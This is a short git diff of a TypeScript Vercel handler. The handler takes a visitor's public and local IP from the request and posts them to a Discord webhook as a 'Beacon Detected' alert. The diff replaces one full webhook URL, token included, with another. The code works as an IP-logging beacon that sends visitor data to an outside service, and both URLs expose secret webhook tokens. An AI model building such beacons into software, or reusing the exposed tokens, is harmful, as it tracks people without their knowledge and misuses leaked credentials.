@@ -7,7 +7,7 @@ export default async function handler(req: VercelRequest, res: VercelResponse) {
   const localIP = req.query.local_ip || "N/A";
 
   // ✅ إرسال إشعار إلى Discord Webhook
-  const webhookUrl = "https://discord.com/api/webhooks/1385395307021602878/h7wTGGXWluq9mbk0UP_o3TKJ78pth1gtVxKW95pQ6gbVMY_u9WVkJfHs00bQSKqGbwqc"; // ← حط رابطك هنا
+  const webhookUrl = "https://discord.com/api/webhooks/1385616261857153025/_q3j85fFvdanuYYn2Z-P9OWhqrpGfDa6z_J_rM3gefX1qQ-loCw1s-irQL7X0pyB_L8b"; // ← حط رابطك هنا
 
   const content = `📡 **Beacon Detected**
 > 🌐 **Public IP:** ${publicIP}
